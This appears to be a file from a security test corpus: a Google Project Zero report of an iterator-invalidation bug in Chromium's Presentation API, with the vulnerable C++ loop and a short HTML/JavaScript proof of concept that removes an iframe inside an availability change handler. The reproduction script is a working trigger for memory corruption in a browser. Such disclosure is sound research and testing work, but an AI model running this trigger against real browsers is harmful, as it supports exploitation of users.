@@ -1,0 +1,47 @@
+<!--
+VULNERABILITY DETAILS
+void PresentationAvailabilityState::UpdateAvailability(
+    const KURL& url,
+    mojom::blink::ScreenAvailability availability) {
+[...]
+  {
+    // Set |iterating_listeners_| so we know not to allow modifications
+    // to |availability_listeners_|.
+    base::AutoReset<bool> iterating(&iterating_listeners_, true);
+    for (auto& listener_ref : availability_listeners_) {
+      auto* listener = listener_ref.get();
+      if (!listener->urls.Contains<KURL>(url))
+        continue;
+
+      auto screen_availability = GetScreenAvailability(listener->urls);
+      DCHECK(screen_availability != mojom::blink::ScreenAvailability::UNKNOWN);
+      for (auto* observer : listener->availability_observers)
+        observer->AvailabilityChanged(screen_availability); // ***1***
+[...]
+
+`PresentationAvailabilityObserver::AvailabilityChanged` might call a user-defined JS event handler,
+which in turn might modify `availability_observers` and invalidate the `for` loop's iterator.
+
+VERSION
+Chromium 74.0.3729.0 (Developer Build) (64-bit)
+Chromium 76.0.3789.0 (Developer Build) (64-bit)
+
+REPRODUCTION CASE
+Note that you need an extra display connected to your machine to reproduce the bug, otherwise
+`UpdateAvailability` won't be called.
+-->
+
+<body>
+<script>
+frame = document.body.appendChild(document.createElement("iframe"));
+request = new frame.contentWindow.PresentationRequest([location]);
+request.getAvailability().then(availability => {
+  availability.onchange = () => frame.remove();
+});
+</script>
+</body>
+
+<!--
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero.
+-->
